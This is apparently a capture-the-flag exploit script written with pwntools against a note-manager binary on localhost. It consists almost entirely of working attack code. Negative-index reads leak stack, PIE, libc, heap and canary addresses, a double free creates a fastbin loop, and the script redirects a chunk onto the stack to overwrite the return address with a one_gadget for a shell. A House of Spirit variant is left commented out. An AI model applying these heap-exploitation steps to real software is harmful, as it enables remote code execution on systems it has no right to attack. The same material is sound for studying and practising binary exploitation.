#! /usr/bin/env python
from pwn import *

def new(size, content):
    io.sendafter("choice> ", "1")
    io.sendafter("size:", str(size))
    io.sendafter("content:", content)

def print_note(index):
    io.sendafter("choice> ", "2")
    io.sendafter("index:", str(index))
    return io.recvline()[:-1]

def delete_note(index):
    io.sendafter("choice> ", "3")
    io.sendafter("index:", str(index))

def leak(addr):
    payload = "-25" + "\x00"*5 + p64(addr)
    leak_addr = u64(print_note(payload)[-6:].ljust(8,'\x00'))
    return leak_addr


io = remote('localhost', 8888)

# libc offset
libc_offset = 0x20830
onegadget_offset = 0x45216 

# new
new(0x48, '123')    #0
new(0x48, '123')    #1
new(0x48, '123')    #2
new(0x48, '123')    #3
new(0x48, '123')    #4
new(0x48, '123')    #5
new(0x58, '123')    #6
new(0x48, '123')    #7
new(0x48, '123')    #8
new(0x48, '123')    #9
new(0x48, '123')    #10
new(0x48, '123')    #11
new(0x48, '123')    #12
new(0x48, '123')    #13
new(0x48, '123')    #14
new(0x48, '123')    #15


# leak libc, stack, PIE and heap
leak_stack = u64(print_note(-6)[-6:].ljust(8,'\x00'))
leak_pie = u64(print_note(-2)[-6:].ljust(8,'\x00'))

rsp = leak_stack - 0xe0         # rsp in print_note
pie_base = leak_pie - 0xe50

print "rsp: "+hex(rsp)
print "PIE: "+hex(pie_base)

canary = rsp+0xd8 +1
libc = rsp+0xe8
heap = rsp+0x30
libc_base = leak(libc) - libc_offset
leak_heap = leak(heap)

payload = "-25" + "\x00"*5 + p64(canary)
leak_canary = u64(print_note(payload)[1:8].ljust(8,'\x00')) * 0x100

print "canary: " + hex(leak_canary)
print "libc: " + hex(libc_base)
print "heap: " + hex(leak_heap)

# create loop

delete_note(14)
delete_note(15)
payload = "-25"+"\x00"*5 + p64(leak_heap + 13*0x50 + 0x60)
delete_note(payload)


# hiject fastbin

new(0x48, p64(rsp+0x30 - 0x48 + 5 - 0x8))     # 15
new(0x48, '123')                            # 14
new(0x48, '123')                            # 15

one_gadget = libc_base + onegadget_offset

raw_input('@')
delete_note(6)
payload = 'A'*(3+8*2) + p64(leak_canary) + 'A'*8*3 + p64(one_gadget)
new(0x48 , payload )

# build fake chunk, House of Spirit
'''
addr2chunk = rsp + (6-23)*0x8
chunk = p64(0x21) + p64(0)*3
payload = "-25"+"\x00"*5 + p64(addr2chunk) + chunk + chunk
raw_input('@')
delete_note(payload)
'''

io.interactive()

